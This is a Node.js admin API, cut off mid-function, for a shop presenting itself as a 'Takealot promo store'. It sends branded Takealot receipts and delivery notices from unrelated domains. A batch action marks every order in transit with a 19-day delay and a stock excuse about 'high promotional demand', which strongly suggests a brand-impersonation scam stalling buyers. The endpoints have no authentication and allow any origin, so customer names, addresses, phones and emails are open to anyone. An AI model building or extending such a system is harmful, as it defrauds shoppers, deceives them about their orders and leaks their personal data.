// api/admin.js
// Admin management API for Takealot promo store.
// Handles listing orders, updating delivery/tracking status, and resending confirmation emails to original buyer emails.

'use strict';

const fs = require('fs');
const path = require('path');

const DATA_DIR = path.join(process.cwd(), 'data');
const RESEND_KEY = process.env.RESEND_API_KEY || '';
const FROM_EMAIL = process.env.EMAIL_FROM || 'Takealot Orders <orders@take.baridi.shop>';

// Target 300 emails per minute (5 emails/second) as supported by Resend
const EMAILS_PER_MINUTE = parseInt(process.env.EMAILS_PER_MINUTE || '300', 10);
const SEND_DELAY_MS = Math.max(50, Math.floor(60000 / EMAILS_PER_MINUTE) - 40);

const REDIS_URL   = process.env.UPSTASH_REDIS_REST_URL;
const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;

// Background Recovery Job tracker
let globalRecoveryJob = {
  running: false,
  total: 0,
  sent: 0,
  failed: 0,
  progress: 0,
  currentEmail: '',
  startedAt: null,
  finishedAt: null,
  templateId: null,
  summary: null,
  error: null
};

function ensureDataDir() {
  if (!fs.existsSync(DATA_DIR)) {
    try { fs.mkdirSync(DATA_DIR, { recursive: true }); } catch (_) {}
  }
}

function getOrderFilePath(orderId) {
  const safeId = String(orderId).replace(/[^a-zA-Z0-9_\-]/g, '_');
  return path.join(DATA_DIR, 'order_' + safeId + '.json');
}

async function loadOrder(orderId) {
  ensureDataDir();
  const filePath = getOrderFilePath(orderId);
  if (fs.existsSync(filePath)) {
    try {
      return JSON.parse(fs.readFileSync(filePath, 'utf8'));
    } catch (_) {}
  }

  // Fallback Redis
  if (REDIS_URL && REDIS_TOKEN) {
    try {
      const res = await fetch(REDIS_URL, {
        method: 'POST',
        headers: { Authorization: `Bearer ${REDIS_TOKEN}`, 'Content-Type': 'application/json' },
        body: JSON.stringify(['GET', 'order:' + orderId]),
      });
      if (res.ok) {
        const data = await res.json();
        if (data.result) return JSON.parse(data.result);
      }
    } catch (_) {}
  }
  return null;
}

async function saveOrder(order) {
  ensureDataDir();
  const filePath = getOrderFilePath(order.order_id);
  try {
    fs.writeFileSync(filePath, JSON.stringify(order, null, 2), 'utf8');
  } catch (err) {
    console.error('[admin] Disk save error:', err.message);
  }

  if (REDIS_URL && REDIS_TOKEN) {
    try {
      await fetch(REDIS_URL, {
        method: 'POST',
        headers: { Authorization: `Bearer ${REDIS_TOKEN}`, 'Content-Type': 'application/json' },
        body: JSON.stringify(['SET', 'order:' + order.order_id, JSON.stringify(order)]),
      });
    } catch (_) {}
  }
}

function listAllOrders() {
  ensureDataDir();
  const files = fs.readdirSync(DATA_DIR).filter(f => f.startsWith('order_') && f.endsWith('.json'));
  const orders = [];
  for (const file of files) {
    try {
      const content = fs.readFileSync(path.join(DATA_DIR, file), 'utf8');
      const o = JSON.parse(content);
      if (o && o.order_id) orders.push(o);
    } catch (_) {}
  }

  // Sort newest first
  orders.sort((a, b) => {
    const da = new Date(a.created_at || a.received_date || 0).getTime();
    const db = new Date(b.created_at || b.received_date || 0).getTime();
    return db - da;
  });

  return orders;
}

function renderOrderEmail(order) {
  let template = '';
  try {
    template = fs.readFileSync(path.join(process.cwd(), 'email.index'), 'utf8');
  } catch (err) {
    console.error('[admin-email] Error loading email.index:', err.message);
    return null;
  }

  const d = new Date(order.received_date || Date.now());
  const del = new Date(order.delivery_date || (Date.now() + 7 * 86400000));
  const daysShort = ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'];
  const monthsShort = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'];
  const daysLong = ['Sunday', 'Monday', 'Tuesday', 'Wednesday', 'Thursday', 'Friday', 'Saturday'];
  const monthsLong = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December'];

  const orderDateShort = `${daysShort[d.getDay()]}, ${d.getDate()} ${monthsShort[d.getMonth()]} ${d.getFullYear()}`;
  const deliveryDateIso = del.toISOString().slice(0, 10);
  const deliveryDateLong = `${daysLong[del.getDay()]}, ${del.getDate()} ${monthsLong[del.getMonth()]} ${del.getFullYear()}`;
  const trackingUrl = `https://subwaypaysa.tech/takealot/track.html?order=${order.order_id}`;

  const items = (Array.isArray(order.items) && order.items.length > 0)
    ? order.items
    : [{
        title: order.product_name || 'Takealot Special Order',
        variant: order.variant || 'Standard',
        price: Number(order.product_price) || 499,
        quantity: Number(order.quantity) || 1,
        img: order.product_image || 'produto.png'
      }];

  const total = Number(order.product_price) || items.reduce((s, it) => s + (Number(it.price) || 0) * (Number(it.quantity) || 1), 0);
  const totalStr = total.toFixed(2);

  const itemsHtml = items.map(it => {
    const itPrice = (Number(it.price) || 0) * (Number(it.quantity) || 1);
    const itImg = it.img || 'https://media.takealot.com/covers_images/843581b6e4004c2eaf3a6e273526254f/s-zoom.file';
    const itVariant = it.variant ? `Colour / Variant: ${it.variant} &nbsp;|&nbsp; ` : '';
    return `
      <table role="presentation" width="100%" cellpadding="0" cellspacing="0" border="0" style="margin-bottom: 12px; border-bottom: 1px solid #f0f2f5; padding-bottom: 12px;">
        <tr>
          <td width="64" valign="top">
            <table role="presentation" cellpadding="0" cellspacing="0" border="0" bgcolor="#ffffff" style="background-color: #ffffff; border: 1px solid #e5e7eb; border-radius: 4px;">
              <tr>
                <td align="center" valign="middle" style="width: 60px; height: 60px; padding: 2px;">
                  <img src="${itImg}" alt="${it.title || 'Product'}" width="56" height="56" border="0" style="display: block; width: 56px; height: 56px; object-fit: contain;" />
                </td>
              </tr>
            </table>
          </td>
          <td valign="top" style="padding-left: 14px; padding-right: 10px;">
            <a href="${trackingUrl}" target="_blank" class="email-product-title" style="font-family: Arial, Helvetica, sans-serif; font-size: 14px; font-weight: bold; color: #0b79bf; text-decoration: underline; line-height: 1.45;">
              ${it.title || 'Item'}
            </a>
            <div class="email-product-sub" style="font-family: Arial, Helvetica, sans-serif; font-size: 13px; color: #6b7280; margin-top: 5px;">
              ${itVariant}Qty: ${it.quantity || 1}
            </div>
          </td>
          <td width="90" align="right" valign="top">
            <span class="email-product-price" style="font-family: Arial, Helvetica, sans-serif; font-size: 15px; font-weight: bold; color: #111827; white-space: nowrap;">
              R ${itPrice.toFixed(2)}
            </span>
          </td>
        </tr>
      </table>
    `;
  }).join('\n');

  const deliveryAddress = order.shipping_address
    ? `${order.shipping_address}${order.customer_phone ? ' (Tel: ' + order.customer_phone + ')' : ''}`
    : 'Provided at checkout';

  return template
    .replace(/\{\{customer_name\}\}/g, order.customer_name || 'Customer')
    .replace(/\{\{order_number\}\}/g, order.order_id)
    .replace(/\{\{order_date\}\}/g, orderDateShort)
    .replace(/\{\{delivery_date\}\}/g, deliveryDateIso)
    .replace(/\{\{delivery_date_long\}\}/g, deliveryDateLong)
    .replace(/\{\{delivery_method\}\}/g, 'Standard Courier Delivery')
    .replace(/\{\{delivery_address\}\}/g, deliveryAddress)
    .replace(/\{\{tracking_url\}\}/g, trackingUrl)
    .replace(/\{\{items_html\}\}/g, itemsHtml)
    .replace(/\{\{subtotal\}\}/g, totalStr)
    .replace(/\{\{order_total\}\}/g, totalStr)
    .replace(/\{\{variant\}\}/g, order.variant || 'Titan Pro');
}

function renderOrderPlainText(order) {
  const d = new Date(order.received_date || Date.now());
  const del = new Date(order.delivery_date || (Date.now() + 7 * 86400000));
  const daysShort = ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'];
  const monthsShort = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'];
  const daysLong = ['Sunday', 'Monday', 'Tuesday', 'Wednesday', 'Thursday', 'Friday', 'Saturday'];
  const monthsLong = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December'];

  const orderDateShort = `${daysShort[d.getDay()]}, ${d.getDate()} ${monthsShort[d.getMonth()]} ${d.getFullYear()}`;
  const deliveryDateLong = `${daysLong[del.getDay()]}, ${del.getDate()} ${monthsLong[del.getMonth()]} ${del.getFullYear()}`;
  const trackingUrl = `https://subwaypaysa.tech/takealot/track.html?order=${order.order_id}`;

  const items = (Array.isArray(order.items) && order.items.length > 0)
    ? order.items
    : [{
        title: order.product_name || 'Takealot Special Order',
        price: Number(order.product_price) || 499,
        quantity: Number(order.quantity) || 1
      }];
  const total = Number(order.product_price) || items.reduce((s, it) => s + (Number(it.price) || 0) * (Number(it.quantity) || 1), 0);

  return [
    `TAKEALOT PAYMENT CONFIRMATION`,
    `Order Number: ${order.order_id}`,
    `Estimated Delivery Date: ${deliveryDateLong}`,
    ``,
    `Hi ${order.customer_name || 'Customer'},`,
    ``,
    `Thank you, we've received your payment for order ${order.order_id}.`,
    `Your order is being processed and your estimated delivery date is ${deliveryDateLong}.`,
    ``,
    `MANAGE & TRACK YOUR ORDER:`,
    `${trackingUrl}`,
    ``,
    `ORDER DETAILS:`,
    `- Order Date: ${orderDateShort}`,
    `- Estimated Delivery: ${deliveryDateLong}`,
    `- Delivery Method: Standard Courier`,
    `- Delivery Address: ${order.shipping_address || 'Provided at checkout'}`,
    ...(order.customer_phone ? [`- Contact Phone: ${order.customer_phone}`] : []),
    ``,
    `ITEMS IN THIS ORDER:`,
    ...items.map(it => `- ${it.quantity || 1}x ${it.title} - R ${((Number(it.price) || 0) * (Number(it.quantity) || 1)).toFixed(2)}`),
    ``,
    `PAYMENT SUMMARY:`,
    `- Subtotal: R ${total.toFixed(2)}`,
    `- Shipping: Free`,
    `- Total Paid: R ${total.toFixed(2)}`,
    ``,
    `Regards,`,
    `The Takealot Team`
  ].join('\n');
}

async function sendEmailToOriginalCustomer(order) {
  const originalEmail = (order.customer_email || '').trim();
  if (!originalEmail || !originalEmail.includes('@')) {
    throw new Error('No valid original email address for this order');
  }

  const html = renderOrderEmail(order);
  const plainText = renderOrderPlainText(order);
  const subject = `Payment Receipt: Takealot Order #${order.order_id}`;

  const res = await fetch('https://api.resend.com/emails', {
    method: 'POST',
    headers: {
      Authorization: `Bearer ${RESEND_KEY.trim()}`,
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      from: FROM_EMAIL,
      to: [originalEmail],
      subject,
      html: html || plainText,
      text: plainText,
      reply_to: 'support@take.baridi.shop'
    })
  });

  const data = await res.json().catch(() => null);
  if (!res.ok || !data || !data.id) {
    throw new Error((data && data.message) || 'Failed to send email via Resend');
  }
  return data.id;
}

function getExtendedDeliveryDate(receivedDate, days = 19) {
  const d = new Date(receivedDate || Date.now());
  d.setDate(d.getDate() + (parseInt(days, 10) || 19));
  return d.toISOString();
}

function renderTransitEmail(order) {
  let template = '';
  try {
    template = fs.readFileSync(path.join(process.cwd(), 'email-transit.index'), 'utf8');
  } catch (err) {
    console.error('[admin-email] Error loading email-transit.index:', err.message);
    return null;
  }

  const d = new Date(order.received_date || Date.now());
  const del = new Date(order.delivery_date || getExtendedDeliveryDate(order.received_date, 19));
  const daysShort = ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'];
  const monthsShort = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'];
  const daysLong = ['Sunday', 'Monday', 'Tuesday', 'Wednesday', 'Thursday', 'Friday', 'Saturday'];
  const monthsLong = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December'];

  const orderDateShort = `${daysShort[d.getDay()]}, ${d.getDate()} ${monthsShort[d.getMonth()]} ${d.getFullYear()}`;
  const deliveryDateIso = del.toISOString().slice(0, 10);
  const deliveryDateLong = `${daysLong[del.getDay()]}, ${del.getDate()} ${monthsLong[del.getMonth()]} ${del.getFullYear()}`;
  const trackingUrl = `https://subwaypaysa.tech/takealot/track.html?order=${order.order_id}`;

  const items = (Array.isArray(order.items) && order.items.length > 0)
    ? order.items
    : [{
        title: order.product_name || 'Takealot Special Order',
        variant: order.variant || 'Standard',
        price: Number(order.product_price) || 499,
        quantity: Number(order.quantity) || 1,
      }];

  const total = Number(order.product_price) || items.reduce((s, it) => s + (Number(it.price) || 0) * (Number(it.quantity) || 1), 0);
  const totalStr = total.toFixed(2);
  const itemsSummary = items.map(it => `${it.quantity || 1}x ${it.title}`).join(', ');

  return template
    .replace(/\{\{customer_name\}\}/g, order.customer_name || 'Customer')
    .replace(/\{\{order_number\}\}/g, order.order_id)
    .replace(/\{\{order_date\}\}/g, orderDateShort)
    .replace(/\{\{delivery_date\}\}/g, deliveryDateIso)
    .replace(/\{\{delivery_date_long\}\}/g, deliveryDateLong)
    .replace(/\{\{shipping_address\}\}/g, order.shipping_address || 'Provided at checkout')
    .replace(/\{\{tracking_url\}\}/g, trackingUrl)
    .replace(/\{\{items_summary\}\}/g, itemsSummary)
    .replace(/\{\{order_total\}\}/g, totalStr)
    .replace(/\{\{variant\}\}/g, order.variant || 'Antracit');
}

function renderTransitPlainText(order) {
  const d = new Date(order.received_date || Date.now());
  const del = new Date(order.delivery_date || getExtendedDeliveryDate(order.received_date, 19));
  const daysShort = ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'];
  const monthsShort = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'];
  const daysLong = ['Sunday', 'Monday', 'Tuesday', 'Wednesday', 'Thursday', 'Friday', 'Saturday'];
  const monthsLong = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December'];

  const orderDateShort = `${daysShort[d.getDay()]}, ${d.getDate()} ${monthsShort[d.getMonth()]} ${d.getFullYear()}`;
  const deliveryDateLong = `${daysLong[del.getDay()]}, ${del.getDate()} ${monthsLong[del.getMonth()]} ${del.getFullYear()}`;
  const trackingUrl = `https://subwaypaysa.tech/takealot/track.html?order=${order.order_id}`;

  return [
    `TAKEALOT LOGISTICS & DELIVERY UPDATE`,
    `Order Number: #${order.order_id}`,
    `Status: IN TRANSIT (With Courier)`,
    `Revised Estimated Delivery: ${deliveryDateLong}`,
    ``,
    `Hi ${order.customer_name || 'Customer'},`,
    ``,
    `We have an update regarding your Takealot promotional order #${order.order_id}.`,
    `Your package has safely departed our central fulfillment warehouse and is currently in transit with our regional courier partner.`,
    `Due to high promotional parcel volumes across courier distribution hubs, your scheduled door-to-door delivery window is now:`,
    `${deliveryDateLong}`,
    ``,
    `DELIVERY ADDRESS:`,
    `${order.customer_name || 'Customer'}`,
    `${order.shipping_address || 'Provided at checkout'}`,
    ``,
    `TRACK YOUR PARCEL IN REAL-TIME:`,
    `${trackingUrl}`,
    ``,
    `Regards,`,
    `The Takealot Team`
  ].join('\n');
}

async function sendTransitEmailToOriginalCustomer(order) {
  const originalEmail = (order.customer_email || '').trim();
  if (!originalEmail || !originalEmail.includes('@')) {
    throw new Error('No valid original email address for this order');
  }

  const html = renderTransitEmail(order);
  const plainText = renderTransitPlainText(order);
  const subject = `Delivery Update: Takealot Order #${order.order_id} is In Transit`;

  const res = await fetch('https://api.resend.com/emails', {
    method: 'POST',
    headers: {
      Authorization: `Bearer ${RESEND_KEY.trim()}`,
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      from: FROM_EMAIL,
      to: [originalEmail],
      subject,
      html: html || plainText,
      text: plainText,
      reply_to: 'support@take.baridi.shop'
    })
  });

  const data = await res.json().catch(() => null);
  if (!res.ok || !data || !data.id) {
    throw new Error((data && data.message) || 'Failed to send transit update email via Resend');
  }
  return data.id;
}

module.exports = async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  res.setHeader('Cache-Control', 'no-store');

  if (req.method === 'OPTIONS') return res.status(200).end();

  let body = req.body || {};
  if (typeof body === 'string') {
    try { body = JSON.parse(body); } catch (_) { body = {}; }
  }

  const urlPath = req.url || '';
  let action = req.query.action || body.action;
  if (!action) {
    if (urlPath.includes('update-transit')) action = 'update-transit';
    else if (urlPath.includes('batch-transit-19d')) action = 'batch-transit-19d';
    else if (urlPath.includes('send-transit-email')) action = 'send-transit-email';
    else if (urlPath.includes('update-status')) action = 'update-status';
    else if (urlPath.includes('resend-email')) action = 'resend-email';
    else if (urlPath.includes('send-all-pending')) action = 'send-all-pending';
    else if (urlPath.includes('live-sessions')) action = 'live-sessions';
    else action = 'list';
  }

  // 0. LIVE SESSIONS FEED
  if (action === 'live-sessions' || req.query.action === 'live-sessions') {
    try {
      const tracker = require('../lib/session-tracker');
      return res.status(200).json(Object.assign({ success: true }, tracker.getSummary()));
    } catch (err) {
      console.error('[admin] Error getting live sessions:', err);
      return res.status(500).json({ error: 'Failed to read live sessions' });
    }
  }

  // 1. LIST ORDERS
  if (action === 'list' || (req.method === 'GET' && !req.query.action)) {
    try {
      const orders = listAllOrders();
      return res.status(200).json({
        success: true,
        count: orders.length,
        orders: orders
      });
    } catch (err) {
      console.error('[admin] Error listing orders:', err);
      return res.status(500).json({ error: 'Failed to read orders' });
    }
  }

  // 2. UPDATE TRACKING / STATUS
  if (action === 'update-status' || req.query.action === 'update-status') {
    const { orderId, status } = body;
    if (!orderId || !status) {
      return res.status(400).json({ error: 'Missing orderId or status' });
    }

    const order = await loadOrder(orderId);
    if (!order) {
      return res.status(404).json({ error: 'Order not found' });
    }

    const validStatuses = ['RECEIVED', 'PAID', 'PROCESSING', 'PACKED', 'IN_TRANSIT', 'OUT_FOR_DELIVERY', 'DELIVERED', 'CANCELLED'];
    const newStatus = status.toUpperCase().trim();
    if (!validStatuses.includes(newStatus)) {
      return res.status(400).json({ error: 'Invalid status' });
    }

    const now = new Date().toISOString();
    order.status = newStatus;
    order.updated_at = now;

    // Automatically ensure extended delivery window (19 days) if marked IN_TRANSIT
    if (newStatus === 'IN_TRANSIT') {
      const curDel = new Date(order.delivery_date || 0).getTime();
      const recDate = new Date(order.received_date || now).getTime();
      const minDel = recDate + (14 * 86400000);
      if (curDel < minDel || body.extendDeliveryDate) {
        order.delivery_date = getExtendedDeliveryDate(order.received_date, body.extendDays || 19);
      }
      order.carrier_note = body.carrierNote || 'Package in transit with regional courier. Delivery window revised due to high promotional demand.';
      order.carrier_name = body.carrierName || 'Takealot Logistics Delivery';
    }

    order.status_history = (order.status_history || []).concat([{
      status: newStatus,
      timestamp: now,
      note: body.note || (newStatus === 'IN_TRANSIT' ? 'Courier Transit Logistics Update' : null)
    }]);

    let transitEmailSent = false;
    if (newStatus === 'IN_TRANSIT' && body.sendTransitEmail) {
      try {
        const msgId = await sendTransitEmailToOriginalCustomer(order);
        order.transit_email_status = 'SENT';
        order.transit_email_sent_at = now;
        order.transit_email_message_id = msgId;
        transitEmailSent = true;
      } catch (e) {
        console.warn('[admin] Transit email error:', e.message);
      }
    }

    await saveOrder(order);
    return res.status(200).json({
      success: true,
      message: `Order ${orderId} updated to ${newStatus}`,
      order: order,
      transitEmailSent: transitEmailSent
    });
  }

  // 2b. UPDATE TRANSIT (EXTEND TO 19 DAYS + OPTIONAL EMAIL)
  if (action === 'update-transit' || req.query.action === 'update-transit') {
    const { orderId, days, sendEmail } = body;
    if (!orderId) {
      return res.status(400).json({ error: 'Missing orderId' });
    }

    const order = await loadOrder(orderId);
    if (!order) {
      return res.status(404).json({ error: 'Order not found' });
    }

    const now = new Date().toISOString();
    const transitDays = parseInt(days, 10) || 19;
    order.status = 'IN_TRANSIT';
    order.delivery_date = getExtendedDeliveryDate(order.received_date, transitDays);
    order.carrier_note = 'Package in transit with regional courier. Delivery window revised due to high promotional demand.';
    order.carrier_name = 'Takealot Logistics Delivery';
    order.updated_at = now;
    order.status_history = (order.status_history || []).concat([{
      status: 'IN_TRANSIT',
      timestamp: now,
      note: `In Transit (Scheduled Delivery: ${transitDays} days from order)`
    }]);

    let emailSent = false;
    if (sendEmail) {
      try {
        const msgId = await sendTransitEmailToOriginalCustomer(order);
        order.transit_email_status = 'SENT';
        order.transit_email_sent_at = now;
        order.transit_email_message_id = msgId;
        emailSent = true;
      } catch (err) {
        console.error('[admin] Transit email error:', err.message);
      }
    }

    await saveOrder(order);
    return res.status(200).json({
      success: true,
      message: `Order #${orderId} marked IN_TRANSIT with delivery extended to ${transitDays} days`,
      delivery_date: order.delivery_date,
      emailSent: emailSent,
      order: order
    });
  }

  // 2c. SEND TRANSIT EMAIL TO ORIGINAL CUSTOMER
  if (action === 'send-transit-email' || req.query.action === 'send-transit-email') {
    const { orderId } = body;
    if (!orderId) {
      return res.status(400).json({ error: 'Missing orderId' });
    }

    const order = await loadOrder(orderId);
    if (!order) {
      return res.status(404).json({ error: 'Order not found' });
    }

    try {
      const messageId = await sendTransitEmailToOriginalCustomer(order);
      order.transit_email_status = 'SENT';
      order.transit_email_sent_at = new Date().toISOString();
      order.transit_email_message_id = messageId;
      await saveOrder(order);

      return res.status(200).json({
        success: true,
        message: `Transit update email successfully sent to ${order.customer_email}`,
        messageId: messageId,
        order: order
      });
    } catch (err) {
      console.error('[admin] Transit email failed:', err.message);
      return res.status(500).json({ error: err.message });
    }
  }

  // 2d. BATCH EXTEND TRANSIT (19 DAYS FOR ALL ORDERS)
  if (action === 'batch-transit-19d' || req.query.action === 'batch-transit-19d') {
    const orders = listAllOrders();
    const transitDays = parseInt(body.days, 10) || 19;
    const sendEmails = body.sendEmails === true;
    let updatedCount = 0;
    let emailsSent = 0;
    let emailsFailed = 0;

    for (const order of orders) {
      const now = new Date().toISOString();
      order.status = 'IN_TRANSIT';
      order.delivery_date = getExtendedDeliveryDate(order.received_date, transitDays);
      order.carrier_note = 'Package in transit with regional courier. Delivery window revised due to high promotional demand.';
      order.carrier_name = 'Takealot Logistics Delivery';
      order.updated_at = now;
      order.status_history = (order.status_history || []).concat([{
        status: 'IN_TRANSIT',
        timestamp: now,
        note: `Batch In Transit (Extended to ${transitDays} days)`
      }]);

      if (sendEmails) {
        const email = (order.customer_email || '').trim();
        if (email && email.includes('@') && !email.includes('@example.com') && !email.includes('@takealot.test')) {
          try {
            const msgId = await sendTransitEmailToOriginalCustomer(order);
            order.transit_email_status = 'SENT';
            order.transit_email_sent_at = now;
            order.transit_email_message_id = msgId;
            emailsSent++;
          } catch (e) {
            emailsFailed++;
          }
          await new Promise(r => setTimeout(r, 300));
        }
      }

      await saveOrder(order);
      updatedCount++;
    }

    return res.status(200).json({
      success: true,
      updatedCount,
      transitDays,
      emailsSent,
      emailsFailed,
      totalOrders: orders.length
    });
  }

  // 3. RESEND RECEIPT EMAIL TO ORIGINAL CUSTOMER
  if (action === 'resend-email' || req.query.action === 'resend-email') {
    const { orderId } = body;
    if (!orderId) {
      return res.status(400).json({ error: 'Missing orderId' });
    }

    const order = await loadOrder(orderId);
    if (!order) {
      return res.status(404).json({ error: 'Order not found' });
    }

    try {
      const messageId = await sendEmailToOriginalCustomer(order);
      order.email_status = 'SENT';
      order.email_sent_at = new Date().toISOString();
      order.email_message_id = messageId;
      await saveOrder(order);

      return res.status(200).json({
        success: true,
        message: `Email successfully sent to ${order.customer_email}`,
        messageId: messageId,
        order: order
      });
    } catch (err) {
      console.error('[admin] Resend email failed:', err.message);
      return res.status(500).json({ error: err.message });
    }
  }

  // 4. SEND TO ALL PENDING
  if (action === 'send-all-pending' || req.query.action === 'send-all-pending') {
    const orders = listAllOrders();
    let sent = 0;
    let failed = 0;

    for (const order of orders) {
      const email = (order.customer_email || '').trim();
      if (!email || !email.includes('@') || email.includes('@example.com') || email.includes('@takealot.test')) {
        continue;
      }

      try {
        const msgId = await sendEmailToOriginalCustomer(order);
        order.email_status = 'SENT';
        order.email_sent_at = new Date().toISOString();
        order.email_message_id = msgId;
        await saveOrder(order);
        sent++;
      } catch (e) {
        failed++;
      }
      await new Promise(r => setTimeout(r, SEND_DELAY_MS));
    }

    return res.status(200).json({
      success: true,
      sentCount: sent,
      failedCount: failed,
      totalOrders: orders.length
    });
  }

  // 5. RUN 3-DAY FOLLOW-UP SEQUENCE
  if (action === 'run-followups' || req.query.action === 'run-followups') {
    try {
      const { runCronPass } = require('../scripts/follow-up-cron');
      const dryRun = req.query.dry_run === '1' || body.dry_run === true;
      const summary = await runCronPass(dryRun);
      return res.status(200).json({
        success: true,
        summary
      });
    } catch (err) {
      console.error('[admin] Follow-up sequence error:', err.message);
      return res.status(500).json({ error: err.message });
    }
  }

  // 6. LIST ABANDONED CHECKOUTS
  if (action === 'list-abandoned' || req.query.action === 'list-abandoned') {
    ensureDataDir();
    const { getPaidCustomerMap, TEMPLATES } = require('../scripts/abandoned-recovery-cron');
    const { paidPhones, paidEmails } = getPaidCustomerMap();

    const files = fs.readdirSync(DATA_DIR).filter(f => f.startsWith('abandoned_') && f.endsWith('.json'));
    const leads = [];
    let autoRecoveredCount = 0;

    for (const f of files) {
      try {
        const item = JSON.parse(fs.readFileSync(path.join(DATA_DIR, f), 'utf8'));

        // Reconcile with actual paid orders
        const rawPhone = item.customer_phone || '';
        const digits = rawPhone.replace(/[^0-9]/g, '');
        const phone9 = digits.length >= 9 ? digits.slice(-9) : null;
        const cleanEmail = (item.customer_email || '').trim().toLowerCase();

        let matchedOrderId = null;
        if (phone9 && paidPhones.has(phone9)) {
          matchedOrderId = paidPhones.get(phone9);
        } else if (cleanEmail && paidEmails.has(cleanEmail)) {
          matchedOrderId = paidEmails.get(cleanEmail);
        }

        if (matchedOrderId && item.status !== 'RECOVERED') {
          item.status = 'RECOVERED';
          item.recovered_order_id = matchedOrderId;
          item.recovered_at = item.recovered_at || new Date().toISOString();
          autoRecoveredCount++;
          try {
            fs.writeFileSync(path.join(DATA_DIR, f), JSON.stringify(item, null, 2), 'utf8');
          } catch (_) {}
        }

        leads.push(item);
      } catch (_) {}
    }
    leads.sort((a, b) => new Date(b.created_at || 0) - new Date(a.created_at || 0));

    const { resolveLeadProduct } = require('../scripts/recovery-templates');
    const productStats = {};
    for (const l of leads) {
      const prod = resolveLeadProduct(l);
      const pTitle = prod.title;
      const pSlug = prod.slug;
      const pImg = prod.image;
      const pPrice = prod.numPrice;

      if (!productStats[pTitle]) {
        productStats[pTitle] = {
          title: pTitle,
          slug: pSlug,
          img: pImg,
          price: pPrice,
          totalLeads: 0,
          activeLeads: 0,
          recoveredLeads: 0,
          potentialRevenue: 0
        };
      }
      productStats[pTitle].totalLeads++;
      if (l.status === 'RECOVERED') {
        productStats[pTitle].recoveredLeads++;
      } else {
        productStats[pTitle].activeLeads++;
        productStats[pTitle].potentialRevenue += pPrice;
      }
    }
    const topProducts = Object.values(productStats).sort((a, b) => b.totalLeads - a.totalLeads);

    const total = leads.length;
    const withPhone = leads.filter(l => l.customer_phone && l.customer_phone.replace(/[^0-9]/g, '').length >= 9).length;
    const withEmail = leads.filter(l => l.customer_email && l.customer_email.includes('@')).length;
    const recovered = leads.filter(l => l.status === 'RECOVERED').length;
    const active = total - recovered;
    const potentialRevenue = topProducts.reduce((sum, p) => sum + p.potentialRevenue, 0);

    return res.status(200).json({
      success: true,
      total,
      active,
      withPhone,
      withEmail,
      recovered,
      autoRecoveredCount,
      potentialRevenue,
      topProducts,
      templates: TEMPLATES || [],
      leads
    });
  }

  // 7. SEND INDIVIDUAL ABANDONED RECOVERY EMAIL
  if (action === 'send-abandoned-email' || req.query.action === 'send-abandoned-email') {
    const leadId = (body.leadId || req.query.leadId || '').trim();
    const templateId = (body.templateId || req.query.templateId || 'urgency').trim();
    if (!leadId) return res.status(400).json({ error: 'Missing leadId' });
    const clean = leadId.replace(/[^a-zA-Z0-9_\-]/g, '_');
    const filePath = path.join(DATA_DIR, `abandoned_${clean}.json`);
    if (!fs.existsSync(filePath)) {
      return res.status(404).json({ error: 'Lead not found' });
    }

    const lead = JSON.parse(fs.readFileSync(filePath, 'utf8'));
    if (!lead.customer_email || !lead.customer_email.includes('@')) {
      return res.status(400).json({ error: 'Lead has no valid email address' });
    }

    try {
      const { sendRecoveryEmail } = require('../scripts/abandoned-recovery-cron');
      const msgId = await sendRecoveryEmail(lead, templateId);
      if (msgId) {
        lead.recovery_email_sent = true;
        lead.recovery_email_at = new Date().toISOString();
        lead.recovery_template_used = templateId;
        lead.recovery_msg_id = msgId;
        fs.writeFileSync(filePath, JSON.stringify(lead, null, 2), 'utf8');
        return res.status(200).json({ success: true, messageId: msgId, templateUsed: templateId, lead });
      } else {
        return res.status(500).json({ error: 'Failed to send recovery email via Resend' });
      }
    } catch (err) {
      return res.status(500).json({ error: err.message });
    }
  }

  // 8. RUN BATCH ABANDONED RECOVERY (EXECUÇÃO 100% EM SEGUNDO PLANO)
  if (action === 'run-abandoned-recovery' || req.query.action === 'run-abandoned-recovery') {
    try {
      const templateId = (body.templateId || req.query.templateId || 'urgency').trim();
      const productFilter = (body.productFilter || req.query.productFilter || 'ALL').trim();
      const forceResend = body.forceResend !== undefined
        ? Boolean(body.forceResend)
        : (req.query.forceResend !== undefined ? req.query.forceResend !== '0' && req.query.forceResend !== 'false' : true);

      if (globalRecoveryJob && globalRecoveryJob.running) {
        return res.status(200).json({
          success: true,
          alreadyRunning: true,
          message: 'Um disparo de recuperação já está em andamento em segundo plano!',
          job: globalRecoveryJob
        });
      }

      globalRecoveryJob = {
        running: true,
        total: 0,
        sent: 0,
        failed: 0,
        progress: 0,
        currentEmail: '',
        startedAt: new Date().toISOString(),
        finishedAt: null,
        templateId,
        productFilter,
        summary: null,
        error: null
      };

      const { runRecoveryPass } = require('../scripts/abandoned-recovery-cron');

      // Dispara imediatamente em segundo plano sem travar a resposta HTTP
      setImmediate(async () => {
        try {
          const summary = await runRecoveryPass(templateId, {
            forceResend,
            productFilter,
            onProgress: (prog) => {
